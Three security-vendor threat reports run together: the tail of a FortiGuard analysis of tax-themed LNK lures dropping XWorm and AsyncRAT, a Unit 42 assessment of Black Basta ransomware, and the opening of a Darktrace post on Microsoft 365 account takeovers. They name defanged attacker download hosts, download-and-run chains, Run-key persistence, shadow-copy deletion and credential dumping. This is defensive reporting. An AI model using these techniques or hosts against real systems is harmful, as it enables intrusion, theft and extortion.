Furthermore, we discovered other files that follow a similar attack pattern; “Mary tax docs.pdf.lnk” (SHA2: 6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0) and “Wilson tax_docs.pdf.lnk” (SHA2: c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e) that were used in March 2023.
As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. 
“Mary tax docs.pdf.lnk”, along with another clean Microsoft Office file, “R&P Sales Summary.docx”, are included in an archived file labeled “2022 tax docs.zip”.
Running the link file triggers the download and execution of “doc.pdf” from “hxxp://datacenter11[.]myftp[.]org/notepad/”.
The “doc.pdf” is actually a VBA file that uses PowerShell to pull and run “hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3”.
While the “a.mp3” is not available for investigation, OSINT (Open Source Intelligence) indicates that the XWorm malware is likely delivered to the victim’s machine. 
XWorm From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm. 
XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150.
XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC).
XWorm can also encrypt files, essentially acting in a similar fashion to ransomware.
Here are screenshots of a recently cracked version of XWorm v3.1: Figure 5.
Leaked cracked version of XWorm v3.1 Figure 6.
Some of the functionalities supported by XWorm v3.1 Figure 7.
Download page of the cracked version of XWorm v.3.1 Going back to the first example, “2022%20tax_documents[.]zip”, we found that it was hosted on the open directory “www[.]farmaciasmv[.]com/citrix/”.
We also found another page on the same domain likely used for phishing hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html.
The files involved in this attack were submitted to VirusTotal.
We don’t believe victims just wander into such malicious sites by accident.
Based on our experience, they were likely lured via malicious links in spam emails. 
Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run.
The basic security practice of not opening files from unknown sources can prevent infection and the damages that follow. 
Dual Malware Wielding Another tax-related attack FortiGuard Labs came across is an image file named “TaxReturn2022.img” (SHA2: 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe) that contains the following files: 
TaxReturn2022.pdf.lnk (SHA2: 180a79cff5ef91ecd744a35b2e433d0a4aae0e4d3b87c40e8e51f5ca02aac4d6) TaxReturns2022.pdf.lnk (SHA2: fa862d43a85a9ea6f046f3edc743b897bba86348c04b8d62ba6eb27f951edf55) TaxReturns2022.zip (SHA2: c4599d4270ba8ef58fb8f1219ecff864acd83145c368ada9406a341d6f4a4fbf) 
We were able to locate another file, “TaxReturns2022.iso” (SHA2: bb7138a106ee2e0a384896316679c750e3287b51fc16a5e65ccd1e44911162d6), that contains identical files. 
Figure 8.
Contents of TaxReturn2022.img Figure 9.
Contents of TaxReturns2022.iso Unfortunately, the infection vector for both files has not been identified, but the likely attack avenue is an email containing malicious attachments and links. 
The TaxReturns2022.zip file within both archives is password-protected with an unknown password, and its contents cannot be extracted. 
As with the previous example, “TaxReturn2022.pdf.lnk” has a PDF icon.
However, it’s a link (shortcut) file, as seen in Figure 4. 
Manually executing the lnk file triggers the download of wed.hta from hxxp://179.43.175[.]187/pqpf/ and saves it as %USERAPPDATA%\wed.hta (SHA2: 0cbaf95b9d4df27442d753dc4cb600eda0a7ecb95e4071f380f69f5f3c89adb1).
The downloaded file is an HTA web file containing VBScript code for the next action and a lot of junk code.
It eventually runs: powershell.exe -ExecutionPolicy
UnRestricted [powershell code This PowerShell code is designed to execute whatever was downloaded.
In this case, it downloads “TaxReturn2022.pdf” from hxxp://179.43.175[.]187/pqpf/, saves it as %USERAPPDATA%\TaxReturn2022.pdf, and opens it.
Unfortunately, this PDF file is a clean decoy file that also requires an unidentified password to open. 
The PowerShell code sets the following registry entry to open the downloaded PDF file every time the computer boots and adds the HIDDEN file attribute to the file: 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\iXqrVo =
[location of downloaded PDF file] 
This behavior led us to believe that the threat actor behind this attack relies on templates and uses them without really knowing what they are because there is no valid reason to open a decoy PDF file at every startup, and adding the HIDDEN file attribute is usually reserved for executables and DLLs. 
The script then sleeps five seconds before downloading and executing whatever has been downloaded.
In this case, it downloads TCywxTOvZk.wsf from hxxp://[redacted].67[.]12:222/ and saves it as %USERAPPDATA%\TCywxTOvZk.wsf (SHA2: 351b0514feaa6a2fc21af25ad7c6c9bed93e38ef896d3fb6c8633924d8615e2d).
Note that part of the IP address masked as the directory is accessible. 
TCywxTOvZk.wsf has only three meaningful lines of code out of almost 2840 lines and downloads and runs hxxp://[redacted].67[.]12:222/no[.]txt (SHA2: d7c63c4d488918aa09fcbd2012d041ed440377af51a87e757c40df3725b1eb07).
no.txt contains VBScript code that downloads and executes hxxp://[redacted].67[.]12:222/j[.]png (SHA2: 460d093a55b930e733c60575f82183cd0edd52ec6b927cdb4a93dc5da7f0ac9c), which is a PowerShell script that creates the following files: C:\ProgramData\Document\py.ps1 C:\ProgramData\schtasks\Microsoft.bat C:\ProgramData\Document\x.ps1 The script then runs Microsoft.bat, which uses MSHTA.exe to run PowerShell code to run py.ps1.
The .ps1 file contains two PE files (stored in $apprun and $appme).
It uses 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe' to reflectively load $apprun, which then loads $appme, which was identified as an ASync RAT variant that connects to the attacker’s Command-and-Control (C2) server located at nulled2nd[.]camdvr[.]org:6666. 
We also found another .lnk file (SHA2: c0a59b28919282b3c45a9619410ea95e35f86dbf43266e6f9a25b94f5948018b) hidden in TaxReturns2022.pdf.iso (SHA2: ee1299f4e56c7f5af243df63192f1c7574152c0600edc49c37b9f8b703da02f2). 
This link file goes through the same infection chain as the previous one: 
The link file downloads and executes hxxp://[redacted].67[.]12:222/xa[.]hta xa[.]hta downloads and executes hxxp://[redacted].67[.]12:222/qDxcmqPPmI[.]wsf qDxcmqPPmI.wsf was not available at the time of the investigation.
However, OSINT led us to find the next action. 
qDxcmqPPmI[.]wsf downloads and executes hxxp://[redacted].67[.]12:222/no[.]txt no[.]txt downloads and executes hxxp://[redacted].67[.]12:222/j[.]png j.png creates py.ps1 and x.ps1.
It also creates and runs Microsoft.bat Microsoft.bat runs py.ps1, which eventually installs Async RAT on the compromised machine Curiously the attacker left the hosting location of the malicious files wide open. 
Figure 10.
Files hosted on the attacker’s open directory 
The directory contains a few files whose names are associated with Adobe Acrobat Reader DC.
This indicates that the threat actor also leverages Adobe as a lure to install the AsyncRAT variant. 
readerdc64_en_l_cra_mdr_install_update.exe[.]lnk (SHA2: 653fcea661d8f7d996210dcdbcad110f0dcca8e7bbc906bb0a4d12e3ab674483) readerdc64_en_l_cra_mdr_install_update[.]exe (SHA2: 1b012d01c86be5d68959504d362c52170b27d726cf2943e2e0250506a29c765a) – this is a legitimate Adobe Acrobat Reader DC installer. 
reader64[.]hta (SHA2: 3b2e776ab44a711a52de88b02c007897eed137b62ecc7fb51bbb3089941bda1a) readerdc64_en_ka_cra_mdr_install_update[.]wsf (SHA2: d2f0995f9184170386360d5eb5990e38a289052e6a15706613c9568a207da7d7) AsyncRAT contains features designed to steal information from compromised machines and a clipper feature that monitors the clipboard for crypto wallet address swapping, which means victims may end up paying more than their taxes. 
But however potential victims end up with the “TaxReturn2022.img” and “TaxReturns2022.pdf.iso” files on their system, users still need to manually mount them and run the fake PDFs to trigger the infection chain.
A little caution can go a long way toward protecting yourself against tax-related malware. 
Conclusion The attacks covered in this blog are the tip of the iceberg.
Attackers make every attempt to scam taxpayers for financial gain and data exfiltration for future attacks.
In the end, those looking to save a dime, in this case, from Uncle Sam, often find that greed endangers them in the cyber world. 
For additional information, please refer to the “Tax Scams/Consumer Alerts” alert issued by the IRS for other tips on protecting yourself from tax-related scams. 
Fortinet Protection FortiGuard AntiVirus detects the malicious files identified in this report with the following signatures: JS/Agent.7593!tr JS/Agent.
GDRU!tr LNK/Agent.1eb5!tr.dldr LNK/Agent.3aad!tr.dldr LNK/Agent.412e!tr.dldr LNK/Agent.9982181!tr LNK/Agent.
BF20!tr LNK/Agent.
FF8D!tr PowerShell/Agent.
E67B!tr VBS/Agent.5247!tr.dldr VBS/Agent.9FA6!tr VBS/Agent.
E67C!tr.dldr VBS/Agent.
XAO!tr VBS/Agent.
YNQ!tr VBS/Agent.
YNY!tr.dldr W32/PasswordProtected.829D!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.
Customers running current AntiVirus updates are protected. 
The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. 
Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is essential to keep all AV and IPS signatures current. 
If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. 
IOCs File IOCs: Network IOCs 
title: Threat Assessment: Black Basta Ransomware url: https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ Executive Summary Black Basta is ransomware as a service (RaaS) that first emerged in April 2022.
However, evidence suggests that it has been in development since February.
The Black Basta operator(s) use the double extortion technique, meaning that in addition to encrypting files on the systems of targeted organizations and demanding ransom to make decryption possible, they also maintain a dark web leak site where they threaten to post sensitive information if an organization chooses not to pay ransom. 
Black Basta affiliates have been very active deploying Black Basta and extorting organizations since the ransomware first emerged.
Although the Black Basta affiliates have only been active for the past couple of months, based on the information posted on their leak site, they have compromised over 75 organizations at the time of this publication.
Unit 42 has also worked on several Black Basta incident response cases. 
The ransomware is written in C++ and impacts both Windows and Linux operating systems.
It encrypts users’ data using a combination of ChaCha20 and RSA-4096, and to speed up the encryption process, the ransomware encrypts in chunks of 64 bytes, with 128 bytes of data remaining unencrypted between the encrypted regions.
The faster the ransomware encrypts, the more systems can potentially be compromised before defenses are triggered.
It is a key factor affiliates look for when joining a Ransomware-as-a-Service group. 
Palo Alto Networks customers receive help with detection and prevention of Black Basta ransomware through the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security services such as WildFire). 
If you think you may have been impacted by a cyber incident, the Unit 42 Incident Response team is available 24/7/365.
You can also take preventative steps by requesting any of our cyber risk management services. 
Table of Contents Black Basta Overview Black Basta is ransomware as a service (RaaS) that leverages double extortion as part of its attacks.
The attackers not only execute ransomware but also exfiltrate sensitive data and threaten to release it publicly if the ransom demands are not met.
The threat actors behind the ransomware deploy a name-and-shame approach to their victim, where they use a Tor site, Basta News, to list all of the victims who have not paid the ransom. 
Although the Black Basta RaaS has only been active for a couple of months, according to its leak site, it had compromised over 75 organizations at the time of this publication.
At least 20 victims were posted to its leak site in the first two weeks of the ransomware’s operation, which indicates the group likely is experienced in the ransomware business and has a steady source of initial access. 
It is also possible that this is not a new operation but rather a rebrand of a previous ransomware group that brought along their affiliates.
Based on multiple similarities in tactics, techniques and procedures (TTPs) - victim-shaming blogs, recovery portals, negotiation tactics, and how quickly Black Basta amassed its victims - that the Black Basta group could include current or former members of the Conti group. 
Unit 42 has observed ​​the Black Basta ransomware group using QBot as an initial point of entry and to move laterally in compromised networks.
QBot, also known as Qakbot, is a Windows malware strain that started as a banking trojan and evolved into a malware dropper.
It has been used by other ransomware groups, including MegaCortex, ProLock, DoppelPaymer and Egregor.
While these ransomware groups used QBot for initial access, the Black Basta group was observed using it for both initial access and to spread laterally throughout the network. 
Figure 1 below shows the standard attack lifecycle observed with Black Basta ransomware. 
Figure 1.
Black Basta attack lifecycle based on Unit 42 incident response cases.
Technical Details Black Basta is written in C++ and is cross-platform ransomware that impacts both Windows and Linux systems.
In June 2022, a VMware ESXi variant of Black Basta was observed targeting virtual machines running on enterprise Linux servers. 
The ransomware includes anti-analysis techniques that attempt to detect code emulation or sandboxing to avoid virtual/analysis machine environments.
It also supports the command line argument -forcepath that is used to encrypt files in a specified directory.
Otherwise, the entire system, except for certain critical directories, is encrypted. 
The ransomware spawns a mutex with a string of dsajdhas.0 to ensure a single instance of the malware is running at a time.
Then it will iterate through the entire file system, encrypting files with a file extension of .basta. 
Black Basta ransomware encrypts users’ data through a combination of ChaCha20 and RSA-4096.
To speed up the encryption process, the ransomware encrypts in chunks of 64 bytes, with 128 bytes of data remaining unencrypted between the encrypted regions.
The ransomware also attempts to delete shadow copies and other backups of files using vssadmin.exe, a command-line tool that manages Volume Shadow Copy Service (VSS), which captures and copies stable images for backups on running systems. 
It writes the Random-letters.ico and Random-letters.jpg files to the %TEMP% directory.
The .jpg file is leveraged to overwrite the desktop background and appears as follows: Figure 2.
Black Basta desktop wallpaper.
It adds a custom icon to the registry, corresponding to the .basta icon, which is shown in Figure 3. 
Figure 3.
Black Basta icon.
It will then boot the system in safe mode and proceed to encrypt files.
Following successful encryption, the file’s extension is changed to .basta
and the ransomware will write numerous instances of readme.txt, which contains the following ransom note: Figure 4.
Black Basta ransom note.
Tactics, Techniques and Procedures We have observed Black Basta affiliates leveraging the following TTPs: Tactic / Technique Notes TA0001 Initial Access T1566.001.
Phishing:
Spear phishing Attachment Victims receive spear phishing emails with attached malicious zip files - typically password protected.
That contains malicious doc including .doc, .pdf, .xls TA0002 Execution T1569.002.
System Services: Service Execution Black Basta has installed and used PsExec to execute payloads on remote hosts. 
T1047.
Windows Management Instrumentation Utilizes Invoke-TotalExec to push out the ransomware binary. T1059.001.
Command and Scripting Interpreter:
PowerShell Black Basta has encoded PowerShell scripts to download additional scripts. 
TA0003 Persistence T1136.
Create Account Black Basta threat actors created accounts with names such as temp, r, or admin. T1098.
Account Manipulation Added newly created accounts to the administrators' group to maintain elevated access. T1543.003.
Create or Modify System Process:
Windows Service Creates benign-looking services for the ransomware binary. T1574.001.
Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. 
TA0004 Privilege Escalation T1484.001.
Domain Policy Modification:
Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1574.001.
Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. T1543.003.
Windows Service Creates benign-looking services for the ransomware binary. 
TA0005 Defense Evasion T1484.001.
Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1218.010.
System Binary Proxy Execution: Regsvr32 Black Basta has used regsvr32.exe to execute a malicious DLL. T1070.004.
Indicator Removal on Host: File Deletion Attempts to delete malicious batch files. 
T1112.
Modify Registry Black Basta makes modifications to the Registry. 
T1140.
Deobfuscate/Decode Files or Information Initial malicious .zip file bypasses some antivirus detection due to password protection. 
T1562.001.
Impair Defenses: Disable or Modify Tools Disables Windows Defender with batch scripts, such as d.bat or defof.bat. 
T1562.004.
Impair Defenses: Disable or Modify System Firewall Uses batch scripts, such as rdp.bat or SERVI.bat, to modify the firewall to allow remote administration and RDP. 
T1562.009.
Impair Defenses: Safe Boot Mode Uses bcdedit to boot the device in safe mode. T1574.001.
Hijack Execution Flow: DLL Search Order Hijacking Black Basta used Qakbot, which has the ability to exploit Windows 7 Calculator to execute malicious payloads. T1622.
Debugger Evasion Uses IsDebuggerPresent to check if processes are being debugged. 
TA0006 Credential Access T1555.
Credentials from Password Stores Black Basta uses Mimikatz to dump passwords. 
TA0007 Discovery T1087.002.
Account Discovery: Domain Account Used commands such as net user /domain and net group /domain. T1016.
System Network Configuration Discovery Lists internal IP addresses to target in C:\Windows\pc_list.txt – typically found on the Domain Controller. T1082.
System Information Discovery Uses GetComputerName to query the computer name. 
T1622.
TA0008 Lateral Movement T1021.001.
Remote Services:
Remote Desktop Protocol Black Basta has used RDP for lateral movement. 
TA0009 Collection T1560.001.
Archive Collected Data: Archive via Utility TA0010 Exfiltration T1567.
Exfiltration over Web Service TA0011 Command and Control T1219.
Remote Access Software Black Basta has installed and used legitimate tools such as TeamViewer and AnyConnect on targeted systems. T1573.
Encrypted Channel Uses Qakbot primarily and Cobalt Strike. 
TA0040 Impact T1486.
Data Encrypted for Impact Black Basta modifies the Desktop background by adding a .jpg in C:\Temp and creating a registry key HKCU\Control Panel\Desktop.
Additionally modifies the registry to change the icon of encrypted files. 
It encrypts files excluding those with a .exe, .cmd, .bat and .com extension.
Uses ChaCha20 or RSA-4096 to encrypt victims. T1489.
Service Stop Uses sc stop and taskkill to stop services. 
T1490.
Inhibit System Recovery Black Basta deletes Volume Shadow Copies using vssadmin. 
Table 1.
Tactics, techniques and procedures for Black Basta activity. 
Victimology 
The ransomware group and its affiliate program reportedly compromised multiple large organizations, in sectors including consumer and industrial products; energy, resources and agriculture; manufacturing; utilities; transportation; government agencies; professional services and consulting; and real estate. 
Black Basta operators also posted on dark web forums expressing interest in attacking organizations based in Australia, Canada, New Zealand, the U.K. and the U.S. Threat actors using the ransomware impacted organizations based in the U.S., Germany, Switzerland, Italy, France and the Netherlands (listed in descending order by numbers of allegedly breached organizations). 
Figure 5.
Black Basta post on dark web forums.
The threat actor(s) responsible for Black Basta operate a cybercrime marketplace and victim name-and-shame blog.
This site is hosted as a Tor hidden service, where the Black Basta ransomware group lists their victims’ names, descriptions, percentage of stolen data which has been published, number of visits and any data exfiltrated.
There were 75 victims listed on the leak site at the time of writing. 
Figure 6.
Black Basta News site where the threat actors post allegedly breached organizations (details redacted) and number of visits.
Courses of Action Several adversarial techniques were observed in activity associated with Black Basta, and the following measures are suggested within Palo Alto Networks products and services to mitigate threats related to Black Basta ransomware, as well as other malware using similar techniques: Product / Service Course of Action Initial Access 
The below courses of action mitigate the following techniques: Spear Phishing Attachment [T1566.001] THREAT PREVENTION Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure a secure antivirus profile is applied to all relevant security policies NEXT-GENERATION FIREWALLS Set up File Blocking CORTEX XDR PREVENT Configure Malware Security Profile CORTEX XSOAR Deploy XSOAR Playbook – Endpoint Malware Investigation Deploy XSOAR Playbook – Phishing Investigation –
Generic V2 Execution The below courses of action mitigate the following techniques: Service Execution
[T1569.002], Windows Management Instrumentation
[T1047], PowerShell [T1059.001] NEXT-GENERATION FIREWALLS Ensure remote access capabilities for the User-ID service account are forbidden. 
Ensure that User-ID is only enabled for internal trusted interfaces Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources exists Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone CORTEX XDR PREVENT Configure Restrictions Security Profile Persistence, Privilege Escalation, Defense Evasion 
The below courses of action mitigate the following techniques: Create Account
[T1136], Account Manipulation [T1098], Regsvr32
[T1218.010], File Deletion
[T1070.004], Disable or Modify Tools [T1562.001], Modify Registry
[T1112], Deobfuscate/Decode Files or Information
[T1140], Disable or Modify System Firewall
[T1562.004], Windows Service [T1543.003], DLL Search Order Hijacking [T1574.001], Group Policy Modification
[T1484.001] NEXT-GENERATION FIREWALLS Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure that the User-ID service account does not have interactive logon rights Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure remote access capabilities for the User-ID service account are forbidden. 
Ensure that User-ID is only enabled for internal trusted interfaces CORTEX XSOAR Deploy XSOAR Playbook – Access Investigation Playbook Deploy XSOAR Playbook – Block Account Generic Deploy XSOAR Playbook – Impossible Traveler CORTEX XDR PREVENT Configure Host Firewall Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Malware Protection Credential Access The below courses of action mitigate the following techniques: Credentials from Password Stores [T1555] CORTEX XDR Cortex XDR monitors for behavioral events and files associated with credential access and exfiltration Discovery 
The below courses of action mitigate the following techniques: System Network Configuration Discovery [T1016],
System Information Discovery [T1082], Domain Account
[T1087.002] CORTEX XDR Cortex XDR monitors for behavioral events along a causality chain to identify discovery behaviors Lateral Movement 
The below courses of action mitigate the following techniques: Remote Desktop Protocol
[T1021.001] NEXT-GENERATION FIREWALLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist Ensure remote access capabilities for the User-ID service account are forbidden Ensure that the User-ID Agent has minimal permissions if User-ID is enabled Ensure that User-ID is only enabled for internal trusted interfaces Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone 
Ensure that the User-ID service account does not have interactive logon rights Ensure that all zones have Zone Protection Profiles with all Reconnaissance Protection settings enabled, tuned and set to appropriate actions Ensure that 'Include/Exclude Networks' is used if User-ID is enabled Ensure that security policies restrict User-ID Agent traffic from crossing into untrusted zones Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources exists CORTEX XDR PREVENT Configure Host Firewall Profile CORTEX XSOAR Deploy XSOAR Playbook – Access Investigation Playbook Deploy XSOAR Playbook – Block Account Generic Collection 
The below courses of action mitigate the following techniques: Archive via Utility [T1560.001] CORTEX XDR Monitors for behavioral events via BIOCs including the creation of zip archives Command and Control The below courses of action mitigate the following techniques: Remote Access Software [T1219],
Encrypted Channel [T1573] CORTEX XSOAR Deploy XSOAR Playbook – PAN-OS Query Logs for Indicators Deploy XSOAR Playbook – Block URL Deploy XSOAR Playbook – Block IP NEXT-GENERATION FIREWALLS Ensure that the Certificate used for Decryption is Trusted Ensure application security policies exist when allowing traffic from an untrusted zone to a more trusted zone Ensure 'Security Policy' denying any/all traffic to/from IP addresses on Trusted Threat Intelligence Sources Exists Ensure 'SSL Forward Proxy Policy' for traffic destined to the Internet is configured Ensure 'SSL Inbound Inspection' is required for all untrusted traffic destined for servers using SSL or TLS Ensure 'Service setting of ANY' in a security policy allowing traffic does not exist THREAT PREVENTION Ensure DNS sinkholing is configured on all anti-spyware profiles in use Ensure passive DNS monitoring is set to enabled on all anti-spyware profiles in use Ensure a secure anti-spyware profile is applied to all security policies permitting traffic to the Internet Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' Ensure an anti-spyware profile is configured to block on all spyware severity levels, categories, and threats Ensure a secure antivirus profile is applied to all relevant security policies URL FILTERING Ensure secure URL filtering is enabled for all security policies allowing traffic to the Internet Ensure all HTTP Header Logging options are enabled Ensure that PAN-DB URL Filtering is used Ensure that URL Filtering uses the action of ‘block’ or ‘override’ on the URL categories Ensure that access to every URL is logged Impact The below courses of action mitigate the following techniques: Data Encrypted for Impact [T1486], Service Stop [T1489],
Inhibit System Recovery [T1490] CORTEX XSOAR Deploy XSOAR Playbook – Ransomware Manual for incident response. 
Deploy XSOAR Playbook – Palo Alto Networks Endpoint Malware Investigation Conclusion Black Basta ransomware operators have been active since at least April 2022.
Although their RaaS has only been active for the past couple of months it had compromised at least 75 organizations at the time of this publication.
Due to the high-profile nature and steady stream of Black Basta attacks identified globally in 2022, the operators and/or affiliates behind the service likely will continue to attack and extort organizations. 
Palo Alto Networks helps detect and prevent Black Basta ransomware in the following ways: WildFire:
All known samples are identified as malware. 
Cortex XDR: Identifies indicators associated with Black Basta. 
Anti-Ransomware Module blocks Black Basta encryption behaviors on Windows. 
Local Analysis detection for Black Basta binaries on Windows and Linux. 
Behavioral Threat Prevention prevents Black Basta behaviors. 
Next-Generation Firewalls:
DNS Signatures detect the known C2 domains, which are also categorized as malware in Advanced URL Filtering. 
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200. Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
Learn more about the Cyber Threat Alliance. 
Additional Resources Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
title: Hafnium-inspired cyber-attacks neutralized by AI url: https://darktrace.com/blog/hafnium-inspired-cyber-attacks-neutralized-by-ai Amidst the ever-changing threat landscape, new tactics, techniques, and procedures (TTPs) seem to emerge daily, creating extreme challenges for security teams.
The broad range of attack methods utilized by attackers seems to present an insurmountable problem: how do you defend against a playbook that does not yet exist?Faced with the growing number of novel and uncommon attack methods, it is essential for organizations to adopt a security solution able to detect threats based on their anomalies, rather than relying on threat intelligence alone. 
In March 2023, Darktrace observed an emerging trend in the use of an application known as ‘PerfectData Software’ for probable malicious purposes in several Microsoft 365 account takeovers.
Using its anomaly-based detection, Darktrace DETECT:trade_mark: was able to identify the activity chain surrounding the use of this application, potentially uncovering a novel piece of threat actor tradecraft in the process.
Microsoft 365 IntrusionsIn recent years, Microsoft’s Software-as-a-Service (SaaS) suite, Microsoft 365, along with its built-in identity and access management (IAM) service, Azure Active Directory (Azure AD), have been heavily targeted by threat actors due to their near-ubiquitous usage across industries.
Four out of every five Fortune 500 companies, for example, use Microsoft 365 services [1]. 
Malicious actors typically gain entry to organizations’ Microsoft 365 environments by abusing either stolen account credentials or stolen session cookies
[2].
Once inside, actors can access sensitive data within mailboxes or SharePoint repositories, and send out emails or Teams messages.
This activity can often result in serious financial harm, especially in cases where the malicious actor’s end-goal is to elicit fraudulent transactions. 
Darktrace regularly observes malicious actors behaving in predictable ways once they gain access to customer Microsoft 365 environment.
One typical example is the creation of new inbox rules and sending deceitful emails intended to convince recipients to carry out subsequent actions, such as following a malicious link or providing sensitive information.
It is also common for actors to register new applications in Azure AD so that they can be used to conduct follow-up activities, like mass-mailing or data theft.
The registration of applications in Azure AD therefore seems to be a relatively predictable threat actor behavior [3][4].
Darktrace DETECT understands that unusual application registrations in Azure AD may constitute a deviation in expected behavior, and therefore a possible indicator of account compromise.
These registrations of applications in Azure AD are evidenced by creations of, as well as assignments of permissions to, Service Principals in Azure AD.
Darktrace has detected a growing trend in actors creating and assigning permissions to a Service Principal named ‘PerfectData Software’.
Further investigation of this Azure AD activity revealed it to be part of an ongoing account takeover. 
‘PerfectData Software’ Activity Darktrace observed variations of the following pattern of activity relating to an application named ‘PerfectData Software’ within its customer base:Actor signs in to a Microsoft 365 account from an endpoint associated with a Virtual Private Server (VPS) or Virtual Private Network (VPN) serviceActor registers an application called 'PerfectData Software' with Azure AD, and then grants permissions to the applicationActor accesses mailbox data and creates inbox rule In two separate incidents, malicious actors were observed conducting their activities from endpoints associated with VPN services (HideMyAss (HMA) VPN and Surfshark VPN, respectively) and from endpoints within the Autonomous System AS396073 MAJESTIC-HOSTING-01. 
In March 2023, Darktrace observed a malicious actor signing in to a Microsoft 365 account from a Kuwait-based IP address within the Autonomous System, AS198605 AVAST Software s.r.o.
This IP address is associated with the VPN service, HMA VPN.
Over the next couple of days, an actor (likely the same malicious actor) signed in to the account several more times from two different Nigeria-based endpoints, as well as a VPS-related endpoint and a HMA VPN endpoint. 
During their login sessions, the actor performed a variety of actions.
First, they created and assigned permissions to a Service Principal named ‘PerfectData Software’.
This Service Principal creation represents the registration of an application called ‘PerfectData Software’ in Azure AD. 
Although the reason for registering this application is unclear, within a few days the actor registered and granted permission to another application, ‘Newsletter Software Supermailer’, and created a new inbox rule names ‘s’ on the mailbox of the hijacked account.
This inbox rule moved emails meeting certain conditions to a folder named ‘RSS Subscription.
The ‘Newsletter Software Supermailer’ application was likely registered by the actor to facilitate mass-mailing activity.
Immediately after these actions, Darktrace detected the actor sending out thousands of malicious emails from the account.
The emails included an attachment named ‘Credit Transfer Copy.html’, which contained a suspicious link.
Further investigation revealed that the customer’s network had received several fake invoice emails prior to this initial intrusion activity.
Additionally, there was an unusually high volume of failed logins to the compromised account around the time of the initial access. 
Figure 1: Advanced Search logs depicting the steps which the actor took after logging in to a user’s Microsoft 365 account.
In a separate case also observed by Darktrace in March 2023, a malicious actor was observed signing in to a Microsoft 365 account from an endpoint within the Autonomous System, AS397086 LAYER-HOST-HOUSTON.
The endpoint appears to be related to the VPN service, Surfshark VPN.
This login was followed by several failed and successful logins from a VPS-related within the Autonomous System, AS396073 MAJESTIC-HOSTING-01.
The actor was then seen registering and assigning permissions to an application called ‘PerfectData Software’.
As with the previous example, the motives for this registration are unclear.
The actor proceeded to log in several more times from a Surfshark VPN endpoint, however, they were not observed carrying out any further suspicious activity. 
Figure 2: Advanced Search logs depicting the steps which the actor took after logging in to a user’s Microsoft 365 account.
It was not clear in either of these examples, nor in fact any of cases observed by Darktrace, why actors had registered and assigned permissions to an application called ‘PerfectData Software’, and there do not appear to be any open-source intelligence (OSINT) resources or online literature related to the malicious usage of an application by that name.
That said, there are several websites which appear to provide email migration and data recovery/backup tools under the moniker ‘PerfectData Software’. 
It is unclear whether the use of ‘PerfectData Software’ by malicious actors observed on the networks of Darktrace customers was one of these tools.
However, given the nature of the tools, it is possible that the actors intended to use them to facilitate the exfiltration of email data from compromises mailboxes.
If the legitimate software ‘PerfectData’ is the application in question in these incidents, it is likely being purchased and misused by attackers for malicious purposes.
It is also possible the application referenced in the incidents is a spoof of the legitimate ‘PerfectData’ software designed to masquerade a malicious application as legitimate.
Darktrace CoverageCases of ‘PerfectData Software’ activity chains detected by Darktrace typically began with an actor signing into an internal user’s Microsoft 365 account from a VPN or VPS-related endpoint.
These login events, along with the suspicious email and/or brute-force activity which preceded them, caused the following DETECT models to breach:SaaS / Access / Unusual External Source for SaaS Credential UseSaaS / Access / Suspicious Login AttemptSaaS / Compromise / Login From Rare Following Suspicious Login Attempt(s)SaaS / Email Nexus / Unusual Location for SaaS and Email ActivitySubsequent activities, including inbox rule creations, registration of applications in Azure AD, and mass-mailing activity, resulted in breaches of the following DETECT models.
